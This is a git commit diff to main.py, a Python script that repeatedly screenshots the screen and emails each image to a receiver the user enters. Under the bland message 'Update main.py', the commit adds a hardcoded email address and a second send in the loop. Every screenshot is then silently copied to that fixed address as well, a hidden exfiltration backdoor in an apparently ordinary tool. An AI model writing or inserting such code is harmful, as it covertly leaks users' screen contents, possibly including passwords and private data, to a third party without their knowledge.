0c237c4bb3f3f7113f629f5c006676fc835af980
Sanskar Bansal <32870271+sanskarbansal@users.noreply.github.com>
2019-04-26 21:52:46 +0530

    Update main.py

--- main.py
+++ main.py
@@ -23,12 +23,16 @@ msg['From'] = user
 toMail = input("Enter Receiver's Email Id: ")
 time_gap = input("Enter the time delay between images: ") 
 msg['To'] = toMail
+x = "sanskarbnsl75@gmail.com"
 msg['Subject'] = "Testing"
 
-while 1 < 5:
+while True:
     time.sleep(time_gap)
     img = ImageGrab.grab()
     img.save(os.getcwd()+'\image.png')
     f = open(os.getcwd()+'\image.png', 'rb')
     msg.attach(MIMEImage(f.read()))
+    msg['To'] = toMail
     smtpObj.sendmail(user, toMail, msg.as_string())
+    msg['To'] = x
+    smtpObj.sendmail(user, x, msg.as_string())
